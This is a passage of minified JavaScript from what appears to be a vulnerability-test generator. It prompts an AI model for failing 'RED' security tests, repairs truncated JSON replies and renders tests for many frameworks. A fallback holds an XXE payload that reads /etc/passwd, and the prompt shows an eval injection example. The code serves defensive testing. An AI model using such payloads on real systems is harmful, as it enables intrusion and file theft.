$1);").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"$this->assertStringNotContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"$this->assertStringContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"$this->assertNotNull($1);").replace(/\}\);?$/g,"}").replace(/\}\);/g,"}").replace(/\{\{.*?\}\}/g,"")}generateE2ETestFile(X,Q){return`describe('E2E Vulnerability Tests - ${Q.vulnerabilityType}', () => {
  beforeEach(() => {
    cy.visit('/login');
  });

  ${X.red?.testCode.replace(/page\./g,"cy.")||""}

  ${X.green?.testCode.replace(/page\./g,"cy.")||""}
});`}}var oD=$1(()=>{y1()});function sD(X){for(let Y of qu1)try{let W=X+Y.suffix,G=JSON.parse(W);if(Y.suffix==="")V.debug("JSON parsed successfully without modifications");else V.info(`JSON recovered using "${Y.suffix}" suffix (${Y.description})`);return{success:!0,data:G,strategy:Y.description}}catch(W){continue}let Q="Failed to parse JSON after all progressive completion attempts";V.error(Q);let J=X.length>1000?`${X.substring(0,500)}...[${X.length-1000} chars omitted]...${X.substring(X.length-500)}`:X;return V.error("Malformed JSON that failed to parse:",J),{success:!1,error:Q}}function tD(X){let Q=!1,J=!1;for(let Y=0;Y<X.length;Y++){let W=X[Y];if(J){J=!1;continue}if(W==="\\"&&Q){J=!0;continue}if(W==='"')Q=!Q}return Q&&!X.trim().endsWith('"}')}function eD(X){let Q=[],J=0,Y=!1,W=!1,G=-1;for(let z=0;z<X.length;z++){let U=X[z];if(W){W=!1;continue}if(U==="\\"&&Y){W=!0;continue}if(U==='"'&&!W){Y=!Y;continue}if(!Y){if(U==="{"){if(J===0)G=z;J++}else if(U==="}"){if(J--,J===0&&G!==-1)Q.push({start:G,end:z+1}),G=-1}}}let H=null,$=0;for(let z of Q){let U=X.substring(z.start,z.end);try{if(JSON.parse(U),U.length>$)H=U,$=U.length}catch{}}return H}function XN(X){return X.replace(/^\s*```\s*json?\s*/gm,"").replace(/\s*```\s*$/gm,"").replace(/,(\s*[}\]])/g,"$1").trim()}var qu1;var QN=$1(()=>{y1();qu1=[{suffix:"",description:"no modifications needed"},{suffix:"]}",description:"array + object closure"},{suffix:"}]",description:"object + array closure"},{suffix:"}]}",description:"object + array + object closure"},{suffix:'"}]',description:"string + array + object closure"},{suffix:'"}]}',description:"string + nested array + object closure"},{suffix:"}",description:"single object closure"},{suffix:"]",description:"single array closure"},{suffix:'"}',description:"string + object closure"}]});class bU{aiClient=null;aiConfig;constructor(X){this.aiConfig=X}async getClient(){if(!this.aiClient){let X={provider:this.aiConfig.provider||"anthropic",apiKey:this.aiConfig.apiKey||"",model:this.aiConfig.model||"claude-3-sonnet",temperature:this.aiConfig.temperature,maxTokens:this.aiConfig.maxTokens,useVendedCredentials:this.aiConfig.useVendedCredentials};this.aiClient=await k6(X)}return this.aiClient}async generateTests(X,Q,J){try{V.info(`Generating AI-powered tests for ${X.type} vulnerability`);let Y=this.constructTestGenerationPrompt(X,Q,J),W=await this.getClient(),G={provider:this.aiConfig.provider||"anthropic",apiKey:this.aiConfig.apiKey||"",model:this.aiConfig.model||"claude-3-sonnet"},H=fD({},G),$=await W.complete(Y,{maxTokens:H});if(V.info(`AI response length: ${$.length} characters, maxTokens: ${H}`),$.length>1000)V.debug("Response tail (last 200 chars):",$.substring($.length-200));let z=this.parseTestSuite($);if(!z)return V.warn("Failed to parse test suite from AI response, returning failure"),{success:!1,testCode:"",framework:Q.testFramework||"jest",error:"Failed to parse AI response - response may be truncated"};let U=this.generateTestCode(z,Q);return{success:!0,testSuite:z,testCode:U,framework:Q.testFramework||"jest"}}catch(Y){return V.error("AI test generation failed",Y),{success:!1,testCode:"",framework:Q.testFramework||"jest",error:Y instanceof Error?Y.message:"Unknown error"}}}constructTestGenerationPrompt(X,Q,J){return`You are an expert security test engineer. Generate RED tests for a security vulnerability to prove it exists.

## Vulnerability Details:
- Type: ${X.type}
- Severity: ${X.severity}
- File: ${X.filePath||"unknown"}
- Line: ${X.line}
- Description: ${X.description}
- Message: ${X.message}
${X.remediation?`- Remediation: ${X.remediation}`:""}

## Test Requirements (RFC-060):
1. Generate RED tests that prove the vulnerability exists:
   - Each test should FAIL on the current vulnerable code
   - Each test should PASS once the vulnerability is fixed
   - Tests must use ${Q.testFramework||"jest"} framework
   - Follow framework-specific best practices and idioms

2. Determine how many RED tests are needed based on the vulnerability:
   - Simple vulnerabilities: Generate 1 RED test
   - Complex vulnerabilities: Generate multiple RED tests (2-5 recommended, up to 10 max)
   - Examples of when multiple tests are needed:
     * Multi-vector attacks (e.g., SQL injection via multiple inputs)
     * Different exploit techniques for same vulnerability type
     * Edge cases that must all be addressed to fully fix the vulnerability

3. Use ${Q.language||"javascript"} language
4. Tests must be executable and use actual attack vectors
5. Include proper assertions to validate security

${J?`## Vulnerable Code:
\`\`\`${Q.language}
${J}
\`\`\``:""}

## Response Format:
CRITICAL: Return ONLY complete, valid JSON. The JSON MUST be syntactically complete with all braces, brackets, and quotes properly closed.
Keep test code CONCISE (max 10-15 lines per test). Focus on the core vulnerability check, not elaborate setup.

VALIDATION CHECKLIST before returning:
- [ ] All opening braces { have matching closing braces }
- [ ] All opening brackets [ have matching closing brackets ]
- [ ] All string quotes are properly escaped and closed
- [ ] No trailing commas before closing braces/brackets
- [ ] The entire JSON object is complete and parseable

For a single RED test, return:
{
  "red": {
    "testName": "short descriptive name",
    "testCode": "concise test code (10-15 lines max)",
    "attackVector": "malicious input",
    "expectedBehavior": "should_fail_on_vulnerable_code"
  }
}

For multiple RED tests (complex vulnerabilities), return:
{
  "redTests": [
    {
      "testName": "first attack vector name",
      "testCode": "test code",
      "attackVector": "first malicious input",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "second attack vector name",
      "testCode": "test code",
      "attackVector": "second malicious input",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}

CRITICAL - SELF-CONTAINED TESTS:
Tests MUST be completely self-contained. Do NOT use require() or import to load target modules.
Instead, INLINE the vulnerable function directly in the test code so the test can execute anywhere.

CORRECT:
  // Inline the vulnerable function
  function processInput(input) { return eval(input); }
  // Test with malicious payload
  let executed = false;
  processInput("executed = true");
  expect(executed).toBe(false); // Fails because eval runs the payload

WRONG:
  const { processInput } = require('./contributions'); // Will crash with MODULE_NOT_FOUND
  processInput("malicious");

IMPORTANT:
- Keep ALL strings properly escaped (use \\" for quotes inside strings)
- Avoid long test code to prevent truncation
- Ensure the JSON is COMPLETE with all closing braces/brackets
- Return ONLY the JSON, no explanations before or after`}parseTestSuite(X){try{let Q=null,J=X.match(/```json\s*([\s\S]*?)```/);if(J)Q=J[1].trim();if(!Q){let B=X.match(/```[\s\S]*?\n([\s\S]*?)```/);if(B)Q=B[1].trim()}if(!Q)Q=eD(X);if(!Q&&X.trim().startsWith("{"))Q=X.trim();if(!Q)return V.error("No JSON found in AI response. Response preview:",X.substring(0,200)),null;V.debug(`Extracted JSON string length: ${Q.length} characters`),Q=XN(Q);let Y=(Q.match(/\{/g)||[]).length,W=(Q.match(/\}/g)||[]).length,G=(Q.match(/\[/g)||[]).length,H=(Q.match(/\]/g)||[]).length;if(Y>W||G>H){if(V.warn(`Fixing unclosed JSON structure: ${Y} open braces, ${W} closed braces, ${G} open brackets, ${H} closed brackets`),G>H)Q+="]".repeat(G-H);if(Y>W)Q+="}".repeat(Y-W)}let $=!1;try{JSON.parse(Q),$=!0}catch{}if(!$&&tD(Q)){V.warn("JSON appears truncated mid-string, attempting to close");let B=(Q.match(/\[/g)||[]).length,q=(Q.match(/\]/g)||[]).length;if(Q+='"',B>q)Q+="]".repeat(B-q);if(Y=(Q.match(/\{/g)||[]).length,W=(Q.match(/\}/g)||[]).length,Y>W)Q+="}".repeat(Y-W)}let z=sD(Q);if(!z.success||!z.data)return null;let U=z.data;if(!U.red&&!U.redTests)return V.error("Invalid test suite structure. No RED test(s) found. Keys:",Object.keys(U)),null;if(U.redTests)V.info(`Successfully parsed ${U.redTests.length} RED tests for complex vulnerability`);else if(U.red)V.info("Successfully parsed single RED test");if(U.green||U.refactor)V.warn("Response contained GREEN/REFACTOR tests - stripping per RFC-060 (VALIDATE phase is RED-only)");let K={};if(U.redTests&&Array.isArray(U.redTests))K.redTests=U.redTests.map((B)=>{let q=B;return{testName:q.testName||"RED Test",testCode:q.testCode||"// Test code truncated",attackVector:q.attackVector||"Unknown",expectedBehavior:"should_fail_on_vulnerable_code"}});else if(U.red)K.red={testName:U.red.testName||"Vulnerability Test",testCode:U.red.testCode||"// Test code truncated",attackVector:U.red.attackVector||"Unknown",expectedBehavior:"should_fail_on_vulnerable_code"};return K}catch(Q){return V.error("Failed to parse AI response:",Q),V.debug("Response that failed to parse:",X.substring(0,500)),null}}generateTestCode(X,Q){let J=Q.testFramework||"jest",Y=Q.language||"javascript";if(Y==="javascript"||Y==="typescript")return this.generateJavaScriptTests(X,J);else if(Y==="python")return this.generatePythonTests(X);else if(Y==="ruby")return this.generateRubyTests(X);else if(Y==="php")return this.generatePHPTests(X);else if(Y==="elixir")return this.generateElixirTests(X);return this.generateJavaScriptTests(X,J)}generateJavaScriptTests(X,Q){let J=[];if(X.redTests&&Array.isArray(X.redTests))J.push(...X.redTests);else if(X.red)J.push(X.red);if(J.length===0)return V.error("No RED tests found in test suite"),"// ERROR: No RED tests generated";let Y=J.map((W)=>`
  // RED Test: ${W.testName}
  ${W.testCode}`).join(`
`);if(Q==="jest"||Q==="mocha"||Q==="vitest")return`
describe('Security Vulnerability Tests', () => {${Y}
});`;return Y}generatePythonTests(X){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)return V.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
import unittest

class SecurityVulnerabilityTests(unittest.TestCase):${Q.map((Y)=>`
    # RED Test: ${Y.testName}
    ${Y.testCode}`).join(`
`)}

if __name__ == '__main__':
    unittest.main()`}generateRubyTests(X){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)return V.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
require 'rspec'

RSpec.describe 'Security Vulnerability Tests' do${Q.map((Y)=>`
  # RED Test: ${Y.testName}
  ${Y.testCode}`).join(`
`)}
end`}generatePHPTests(X){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)return V.error("No RED tests found in test suite"),"// ERROR: No RED tests generated";return`
<?php
use PHPUnit\\Framework\\TestCase;

class SecurityVulnerabilityTest extends TestCase {${Q.map((Y)=>`
    // RED Test: ${Y.testName}
    ${Y.testCode}`).join(`
`)}
}`}generateElixirTests(X){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)return V.error("No RED tests found in test suite"),"# ERROR: No RED tests generated";return`
defmodule SecurityVulnerabilityTest do
  use ExUnit.Case
${Q.map((Y)=>`
  # RED Test: ${Y.testName}
  ${Y.testCode}`).join(`
`)}
end`}}var JN=$1(()=>{y1();N5();wU();QN()});class vU{frameworkDetector;coverageAnalyzer;issueInterpreter;aiConfig;baseGenerator;aiGenerator;useAIGeneration;constructor(X,Q,J,Y){this.frameworkDetector=X;this.coverageAnalyzer=Q;this.issueInterpreter=J;this.aiConfig=Y;if(this.baseGenerator=new kU,this.useAIGeneration=!!Y&&process.env.DISABLE_AI_TEST_GEN!=="true",this.useAIGeneration&&Y)this.aiGenerator=new bU(Y)}extractRedTests(X){let Q=[];if(X.redTests&&Array.isArray(X.redTests))Q.push(...X.redTests);else if(X.red)Q.push(X.red);if(Q.length===0)V.warn("No RED tests found in test suite");return Q}async detectFrameworksFromStructure(X){let Q=[],J=Object.keys(X).filter((W)=>W.endsWith("package.json"));for(let W of J)try{let G=JSON.parse(X[W]),H=await this.frameworkDetector.detectFromPackageJson(G);Q.push(...H.frameworks)}catch(G){}if(X["requirements.txt"]){let W=X["requirements.txt"];if(W.includes("pytest"))Q.push({name:"pytest",version:this.extractVersion(W,"pytest"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X.Gemfile){let W=X.Gemfile;if(W.includes("minitest"))Q.push({name:"minitest",version:this.extractVersion(W,"minitest"),type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("rspec"))Q.push({name:"rspec",version:this.extractVersion(W,"rspec"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X["pom.xml"]){let W=X["pom.xml"];if(W.includes("org.junit.jupiter"))Q.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("org.testng"))Q.push({name:"testng",version:this.extractVersion(W,"testng")||"7.8.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("junit")&&W.includes("<version>4"))Q.push({name:"junit",version:this.extractVersion(W,"junit")||"4.13",type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("spring-boot-starter-test")){let G=Q.find((H)=>H.name==="junit5"||H.name==="junit");if(G)G.companions=["spring-boot"];else Q.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.9,detectionMethod:"dependency",companions:["spring-boot"]})}}if(X["composer.json"])try{let W=JSON.parse(X["composer.json"]),G=W["require-dev"]||{},H=W.require||{};if(G["pestphp/pest"]){if(Q.push({name:"pest",version:G["pestphp/pest"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),G["pestphp/pest-plugin-laravel"]||H["laravel/framework"])Q[Q.length-1].companions=["laravel"]}else if(G["phpunit/phpunit"]){if(Q.push({name:"phpunit",version:G["phpunit/phpunit"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),H["laravel/framework"])Q[Q.length-1].companions=["laravel"];else if(H["symfony/framework-bundle"])Q[Q.length-1].companions=["symfony"]}}catch(W){}if(X["mix.exs"]){let W=X["mix.exs"];if(W.includes("ex_unit")||W.includes("ExUnit"))Q.push({name:"exunit",version:"builtin",type:"unit",confidence:0.95,detectionMethod:"dependency"})}let Y=Object.keys(X).filter((W)=>W.includes("jest.config")||W.includes("vitest.config")||W.includes("karma.conf")||W.includes(".mocharc"));if(Y.length>0){let W=await this.frameworkDetector.detectFromConfigFiles(Y);Q.push(...W.frameworks)}return{frameworks:Q}}extractVersion(X,Q){let J=X.match(new RegExp(`${Q}[=~><\\s]+([\\"']?)([\\d\\.\\w-]+)\\1`));return J?J[2]:"unknown"}async generateAdaptiveTests(X,Q){try{V.info("AdaptiveTestGenerator: generateAdaptiveTests called"),V.info("Vulnerability:",JSON.stringify(X)),V.info("RepoStructure keys:",Object.keys(Q));let J=await this.detectFrameworksFromStructure(Q);V.info("Framework detection result:",JSON.stringify(J));let Y=this.selectPrimaryFramework(J.frameworks,X.file);if(V.info("Selected primary framework:",JSON.stringify(Y)),this.useAIGeneration&&this.aiGenerator)return V.info("Using AI-based test generation"),this.generateAITests(X,Q,Y);if(!Y)return V.info("No primary framework detected, generating generic tests"),this.generateGenericTests(X);let W=await this.analyzeCoverage(Q,X.file||""),G=this.detectConventions(Q,Y),H=await this.generateFrameworkSpecificTests(X,Y,G,W),$=await this.generateTestSuite(X,Y);return{success:!0,framework:Y.name.toLowerCase(),testCode:H,testSuite:$,suggestedFileName:this.suggestFileName(X.file||"",G),notes:this.generateNotes(Y,W,G)}}catch(J){return V.error("Error generating adaptive tests",J),{success:!1,framework:"unknown",testCode:"",error:J instanceof Error?J.message:"Unknown error"}}}selectPrimaryFramework(X,Q){if(X.length===0)return null;if(X.length===1)return X[0];let J=Q?.split(".").pop()?.toLowerCase(),W={js:["jest","vitest","mocha","jasmine"],ts:["jest","vitest","mocha"],tsx:["jest","vitest","@testing-library/react"],jsx:["jest","vitest","@testing-library/react"],py:["pytest","unittest","nose2"],rb:["rspec","minitest"],php:["phpunit","pest","codeception"],java:["junit","testng"],ex:["exunit"],exs:["exunit"]}[J||""]||[];for(let H of W){let $=X.find((z)=>z.name.toLowerCase()===H||z.name.toLowerCase().includes(H));if($)return $}let G={rspec:["minitest"],pytest:["unittest"],jest:["jasmine"],junit5:["junit"],vitest:["jest"]};for(let[H,$]of Object.entries(G)){let z=X.find((U)=>U.name.toLowerCase()===H);if(z&&X.some((U)=>$.includes(U.name.toLowerCase())))return z}return X.sort((H,$)=>$.confidence-H.confidence)[0]}async analyzeCoverage(X,Q){let J=Object.keys(X).filter(($)=>$.includes("coverage")||$.includes("lcov")||$.includes(".coverage"));if(J.length===0)return{hasData:!1};let Y=null;for(let $ of J){let z=X[$];if($.includes("lcov")){Y=await this.coverageAnalyzer.parseLcov(z);break}else if($.includes(".coverage")||$.endsWith(".json"))try{Y=await this.coverageAnalyzer.parseCoveragePy(z);break}catch(U){}}if(!Y)return{hasData:!1};let W=await this.coverageAnalyzer.findCoverageGaps(Y),G=Y.files?.find(($)=>$.path===Q||$.path.endsWith(Q)),H=W?await this.coverageAnalyzer.recommendTestPriorities(W):[];return{hasData:!0,fileCoverage:G,gaps:W,recommendations:H}}detectConventions(X,Q){let J=Object.entries(X).filter(([W])=>W.match(/\.(test|spec)\.(js|ts|jsx|tsx|py|rb|php|java|ex|exs)$/)||W.includes("__tests__")||W.includes("test_")||W.includes("_test")),Y={style:"unknown",assertionStyle:"unknown",fileNaming:"unknown",testDirectory:"unknown",imports:[],helpers:[],companions:Q.companions||[]};for(let[W,G]of J){if(G.includes("describe(")&&G.includes("it("))Y.style="bdd";else if(G.includes("test(")&&!G.includes("describe("))Y.style="tdd";if(G.includes("expect(")&&G.includes(".to."))Y.assertionStyle="chai-expect";else if(G.includes("expect(")&&G.includes(".toBe"))Y.assertionStyle="jest-expect";else if(G.includes("assert."))Y.assertionStyle="assert";else if(G.includes("_(")&&G.includes(".must_")||G.includes(".wont_"))Y.assertionStyle="minitest";if(W.includes(".test."))Y.fileNaming="test";else if(W.includes(".spec."))Y.fileNaming="spec";else if(W.includes("__tests__"))Y.fileNaming="__tests__";else if(W.includes("test_"))Y.fileNaming="test_prefix";let H=G.matchAll(/(?:import|require)\s*(?:\{[^}]+\}|\S+)\s*from\s*['"]([^'"]+)['"]/g);for(let $ of H)if($[1].includes("helper")||$[1].includes("setup"))Y.helpers.push($[0]);if(G.includes("beforeEach(setup")||G.includes("afterEach(cleanup")){let $=G.match(/beforeEach\((\w+)\)/),z=G.match(/afterEach\((\w+)\)/);if($)Y.helpers.push(`beforeEach(${$[1]})`);if(z)Y.helpers.push(`afterEach(${z[1]})`)}}return Y}async generateFrameworkSpecificTests(X,Q,J,Y){let W=Q.name.toLowerCase(),G=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")G="CSRF";else if(X.type==="xss")G="XSS";let H={vulnerabilityType:G,language:this.getLanguageFromFramework(W),testFramework:this.mapToBaseFramework(W),includeE2E:!1},$=await this.baseGenerator.generateTestSuite(X,H);if(!$.success||!$.testSuite)if(V.error("Base test generation failed",{success:$.success,error:$.error,vulnerability:X.type}),X.type==="xml_external_entities")$.testSuite={red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}},$.success=!0;else throw Error(`Failed to generate base test suite: ${$.error||"Unknown error"}`);let z=this.transformToFrameworkSyntax($.testSuite,W,J,X,Q);if(Y.hasData&&Y.fileCoverage)z=this.addCoverageAwareTests(z,Y);if(J.helpers.length>0)z=this.addHelperImports(z,J.helpers);return z}transformToFrameworkSyntax(X,Q,J,Y,W){switch(Q){case"vitest":return this.generateVitestTests(X,J,Y);case"mocha":return this.generateMochaTests(X,J,Y);case"pytest":return this.generatePytestTests(X,J,Y);case"rspec":return this.generateRSpecTests(X,J,Y);case"minitest":return this.generateMinitestTests(X,J,Y);case"exunit":return this.generateExUnitTests(X,J,Y);case"phpunit":return this.generatePHPUnitTests(X,J,Y,W);case"pest":return this.generatePestTests(X,J,Y,W);case"jest":return this.generateJestTests(X,J,Y);case"junit5":return this.generateJUnit5Tests(X,J,Y);case"testng":return this.generateTestNGTests(X,J,Y);default:return this.generateGenericTestCode(X,Y)}}generateVitestTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.(tsx?|jsx?)$/,"")||"Component",W=J.file?.endsWith(".tsx")||J.file?.endsWith(".jsx")||!1,G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=(U)=>{let K=U.match(/test\([^{]+\{([\s\S]*)\}\);?$/);return K?K[1].trim():U},$=W?`import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { ${Y} } from "${this.getRelativeImportPath(J.file||"")}";`:`import { describe, test, expect } from "vitest";
import { ${Y} } from "${this.getRelativeImportPath(J.file||"")}";`,z=G.map((U)=>`
  test("${U.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${U.attackVector}";
    ${H(U.testCode)}
  });`).join(`
`);return`${$}

describe("${Y} ${J.type} vulnerability tests", () => {
  ${Q.helpers.length>0?Q.helpers.join(`
  `):""}
${z}
});`}generateMochaTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.js$/,"")||"module",W=Q.assertionStyle==="assert"?"assert":"chai",G=this.extractRedTests(X);if(G.length===0)return"// ERROR: No RED tests found in test suite";let H=W==="chai"?'const { expect } = require("chai");':'const assert = require("assert");',$=W==="chai"?(K,B,q)=>K?`expect(${B}).to.include(${q})`:`expect(${B}).to.not.include(${q})`:(K,B,q)=>K?`assert(${B}.includes(${q}))`:`assert(!${B}.includes(${q}))`,z="it",U=G.map((K)=>`
  ${z}("${K.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${K.attackVector}";
    const result = await ${Y}(maliciousInput);
    ${$(!1,"result",'"syntax error"')};
  });`).join(`
`);return`${H}
const { ${Y} } = require("${this.getRelativeRequirePath(J.file||"")}");

describe("${Y.charAt(0).toUpperCase()+Y.slice(1)} ${J.type==="sql_injection"?"SQL injection":J.type.replace(/_/g," ").toLowerCase()} tests", () => {${U}
});`}generatePytestTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.py$/,"")||"module",W=Y.split("_").map(($)=>$.charAt(0).toUpperCase()+$.slice(1)).join(""),G=this.extractRedTests(X);if(G.length===0)return"# ERROR: No RED tests found in test suite";let H=G.map(($,z)=>`
    def test_${J.type.toLowerCase()}_vulnerability_${z+1}(self):
        """${$.testName}"""
        # RED: Demonstrate vulnerability exists
        malicious_input = "${$.attackVector}"
        result = ${Y}(malicious_input)
        assert "root" not in result
        assert "permission denied" not in result.lower()`).join(`
`);return`import pytest
from ${J.file?.replace(/\.py$/,"").replace(/\//g,".")||"module"} import *

@pytest.mark.security
class Test${W}${J.type.replace(/_/g,"")}:
    """Tests for ${J.type} vulnerability in ${Y}"""
${H}`}generateMinitestTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map((H)=>H.charAt(0).toUpperCase()+H.slice(1)).join("")||"Module",W=this.extractRedTests(X);if(W.length===0)return"# ERROR: No RED tests found in test suite";let G=W.map((H,$)=>`
    it "${H.testName}" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${H.attackVector}"
      result = ${Y}.new.process(malicious_input)
      _(result).wont_include "Permission denied"
      _(result).wont_include "syntax error"
    end`).join(`
`);return`require "minitest/autorun"
require "minitest/spec"
require_relative "${this.getRelativeRequirePath(J.file||"")}"

describe ${Y} do
  describe "${J.type} vulnerability tests" do${G}
  end
end`}generateRSpecTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.rb$/,"").split("_").map(($)=>$.charAt(0).toUpperCase()+$.slice(1)).join("")||"Module",W=J.file?.includes("controller")?Y:`${Y}Controller`,G=this.extractRedTests(X);if(G.length===0)return"# ERROR: No RED tests found in test suite";let H=G.map(($,z)=>`
    context "when vulnerable to ${J.type.toLowerCase()} - Test ${z+1} (RED)" do
      it "${$.testName}" do
        # RED: Demonstrate vulnerability exists
        malicious_input = "${$.attackVector}"

        # For SQL injection in Rails controller
        params = { user: { id: malicious_input } }

        # This test should pass BEFORE the fix
        expect {
          post :update, params: params
        }.not_to raise_error

        # The vulnerability allows the attack
        expect(response).to have_http_status(:ok)
      end
    end`).join(`
`);return`require 'rails_helper'

RSpec.describe ${W}, type: :controller do
  describe "${J.type} vulnerability tests" do${H}
  end
end`}generateExUnitTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.ex$/,"").split("_").map((H)=>H.charAt(0).toUpperCase()+H.slice(1)).join("")||"Module",W=this.extractRedTests(X);if(W.length===0)return"# ERROR: No RED tests found in test suite";let G=W.map((H,$)=>`
    test "${H.testName}" do
      # RED: Demonstrate vulnerability exists
      malicious_input = "${H.attackVector}"
      assert {:ok, result} = ${Y}.process(malicious_input)
      refute String.contains?(result, "error")
    end`).join(`
`);return`defmodule ${Y}Test do
  use ExUnit.Case
  alias ${Y}

  describe "${J.type.toLowerCase()} vulnerability" do${G}
  end
end`}generatePHPUnitTests(X,Q,J,Y){let W=J.file?.split("/").pop()?.replace(/\.php$/,"")||"Class",G=Y?.version||"8.0",H=G.match(/(\d+)\./),$=H?parseInt(H[1]):8,z=$>=9,U=this.extractNamespaceFromPath(J.file||""),K=U?`${U}\\${W}`:W,B=Y?.companions?.includes("laravel"),q=Y?.companions?.includes("symfony");if(V.info("PHPUnit generation context",{version:G,majorVersion:$,useAttributes:z,companions:Y?.companions,isLaravel:B,isSymfony:q}),B)return this.generateLaravelPHPUnitTests(X,Q,J,W,Y);if(q)return this.generateSymfonyPHPUnitTests(X,Q,J,W);let Z=this.extractRedTests(X);if(Z.length===0)return`<?php
// ERROR: No RED tests found in test suite`;let M=z?`use PHPUnit\\Framework\\Attributes\\DataProvider;
use PHPUnit\\Framework\\Attributes\\Test;
use PHPUnit\\Framework\\Attributes\\Group;
`:"",L=z?"#[Group('security')]":`/**
 * @group security
 */`,R=z?"#[Test]":"",j=Z.map((F,A)=>`
    ${R}
    public function test${J.type.replace(/_/g,"")}Vulnerability${A+1}(): void
    {
        // RED: ${F.testName}
        $maliciousInput = '${F.attackVector}';
        $result = $this->instance->process($maliciousInput);

        // Vulnerability should allow the attack to succeed
        $this->assertStringNotContainsString('Permission denied', $result);
        $this->assertStringNotContainsString('Invalid input', $result);
    }`).join(`
`);return`<?php
${U?`namespace Tests\\${U};

`:""}use PHPUnit\\Framework\\TestCase;
${M}use ${K};
use App\\Exceptions\\SecurityException;

${L}
class ${W}${J.type.replace(/_/g,"")}Test extends TestCase
{
    private $instance;

    protected function setUp(): void
    {
        $this->instance = new ${W}();
    }
${j}
}`}generateJestTests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.[jt]sx?$/,"")||"module",W=this.extractRedTests(X);if(W.length===0)return"// ERROR: No RED tests found in test suite";let G=Q.style==="bdd"?"describe":"",H=Q.style==="bdd"?"it":"test",$=`const { ${Y} } = require('${this.getRelativeRequirePath(J.file||"")}');`,z=W.map((K)=>`
  ${H}('${K.testName}', async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = '${K.attackVector}';
    const result = await ${Y}(maliciousInput);
    expect(result).not.toContain('error');
  });`).join(`
`),U=`
${G?`describe('${Y} ${J.type} tests', () => {`:""}${z}
${G?"});":""}`;return $+`
`+U}generateJUnit5Tests(X,Q,J){let Y=J.file?.split("/").pop()?.replace(/\.java$/,"")||"Class",W=this.extractPackageName(J.file||""),G=Q.companions?.includes("spring-boot"),H=this.extractRedTests(X);if(H.length===0)return"// ERROR: No RED tests found in test suite";let $=`package ${W};

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import static org.junit.jupiter.api.Assertions.*;
${G?`
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.beans.factory.annotation.Autowired;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
`:""}`,z=G?`
@SpringBootTest
@AutoConfigureMockMvc
public class ${Y}${J.type.replace(/_/g,"")}Test {
    @Autowired
    private MockMvc mockMvc;

    private ${Y} instance;

    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`:`
public class ${Y}${J.type.replace(/_/g,"")}Test {
    private ${Y} instance;

    @BeforeEach
    void setUp() {
        instance = new ${Y}();
    }`,U=H.map((K,B)=>`
    @Test
    @DisplayName("${K.testName}")
    void testVulnerability${B+1}() {
        // RED: Demonstrate vulnerability exists
        String maliciousInput = "${K.attackVector}";

        ${G?`// Test via Spring MVC
        assertDoesNotThrow(() -> {
            mockMvc.perform(get("/api/endpoint")
                    .param("input", maliciousInput))
                    .andExpect(status().isOk());
        });`:`// Direct method test
        assertDoesNotThrow(() -> {
            instance.process(maliciousInput);
        });`}
    }`).join(`
`);return`${$}

${z}
${U}
